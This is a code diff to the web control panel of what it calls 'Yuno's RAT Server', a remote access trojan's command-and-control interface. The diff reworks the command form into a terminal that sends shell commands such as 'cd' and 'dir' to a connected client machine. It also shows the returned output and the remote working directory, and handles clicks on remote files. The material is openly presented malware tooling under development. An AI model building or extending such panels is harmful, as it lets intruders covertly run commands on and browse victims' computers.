@@ -157,7 +157,7 @@
 
         @media (min-width: 768px) {
             .command-form {
-                grid-template-columns: 1fr 1fr auto;
+                grid-template-columns: 1fr auto;
             }
         }
 
@@ -168,6 +168,7 @@
             padding: 8px 12px;
             border-radius: 6px;
             font-family: inherit;
+            width: 100%;
         }
 
         .form-control:focus {
@@ -274,7 +275,7 @@
         <!-- Header -->
         <div class="header">
             <h1>Yuno's RAT Server</h1>
-            <p>Remote Access Terminal</p>
+            <p>Remote Access Terminal - Professional Interface</p>
             <div class="credits">Made by Izumi</div>
         </div>
 
@@ -333,29 +334,26 @@
                         <polyline points="4,17 10,11 4,5"/>
                         <line x1="12" y1="19" x2="20" y2="19"/>
                     </svg>
-                    <h3 class="card-title purple">Command Interface</h3>
+                    <h3 class="card-title purple">Command Terminal</h3>
                 </div>
-                <form class="command-form" id="command-form">
-                    <select class="form-control" id="client-id" name="client_id" required>
-                        <option value="">Select a client</option>
-                        {% for client in clients %}
-                            <option value="{{ client }}">{{ client }}</option>
-                        {% endfor %}
-                    </select>
-                    <input type="text" class="form-control" id="command" name="command" placeholder="Enter command (e.g., dir)" required>
-                    <button type="submit" class="btn">
-                        <svg class="icon" viewBox="0 0 24 24">
-                            <line x1="22" y1="2" x2="11" y2="13"/>
-                            <polygon points="22,2 15,22 11,13 2,9 22,2"/>
-                        </svg>
-                        Send
-                    </button>
-                </form>
+                <div class="command-form" id="command-terminal">
+                    <input type="text" class="form-control" id="current-dir" readonly style="background: #1e293b; border-color: #64748b; color: #94a3b8;" value="[Unknown]">
+                    <div style="display: flex; gap: 8px;">
+                        <input type="text" class="form-control" id="command-input" placeholder="Enter command (e.g., cd dir, dir)" required>
+                        <button type="button" class="btn" id="send-command">
+                            <svg class="icon" viewBox="0 0 24 24">
+                                <line x1="22" y1="2" x2="11" y2="13"/>
+                                <polygon points="22,2 15,22 11,13 2,9 22,2"/>
+                            </svg>
+                            Send
+                        </button>
+                    </div>
+                </div>
                 
                 <div class="separator"></div>
                 
                 <div>
-                    <h4 style="font-size: 0.875rem; font-weight: 500; color: #cbd5e1; margin-bottom: 8px;">Command Output</h4>
+                    <h4 style="font-size: 0.875rem; font-weight: 500; color: #cbd5e1; margin-bottom: 8px;">Terminal Output</h4>
                     <div class="output-container" id="command-output">No command output yet...</div>
                 </div>
             </div>
@@ -396,10 +394,14 @@
 
         socket.on('command_output', (data) => {
             const outputDiv = document.getElementById('command-output');
+            const currentDirInput = document.getElementById('current-dir');
             const timestamp = data.timestamp;
             const clientId = data.client_id;
             const command = data.command;
             const output = data.output;
+            const currentDir = data.current_dir;
+            // Update current directory
+            currentDirInput.value = `[${currentDir}]`;
             // Append the output with timestamp
             const newOutput = `[${timestamp}] ${clientId} executed "${command}":\n${output}\n\n`;
             outputDiv.textContent += newOutput;
@@ -412,18 +414,29 @@
             document.getElementById('current-time').textContent = new Date().toLocaleString();
         }
 
-        // Handle command form submission
-        document.getElementById('command-form').addEventListener('submit', async (e) => {
-            e.preventDefault();
-            const formData = new FormData(e.target);
+        // Handle command input
+        document.getElementById('send-command').addEventListener('click', async () => {
+            const commandInput = document.getElementById('command-input');
+            const command = commandInput.value.trim();
+            if (!command) return;
+
+            const selectedClient = document.querySelector('#clients-list .client-item:first-child .client-ip')?.textContent || '';
+            if (!selectedClient) {
+                alert('No client selected');
+                return;
+            }
+
+            const formData = new FormData();
+            formData.append('client_id', selectedClient);
+            formData.append('command', command);
+
             const response = await fetch('/send_command', {
                 method: 'POST',
                 body: formData
             });
             const result = await response.json();
-            console.log(`Command "${formData.get('command')}" sent to ${formData.get('client_id')}: ${result.message}`);
-            // Clear command input
-            document.getElementById('command').value = '';
+            console.log(`Command "${command}" sent to ${selectedClient}: ${result.message}`);
+            commandInput.value = '';
         });
 
         // Handle file clicks
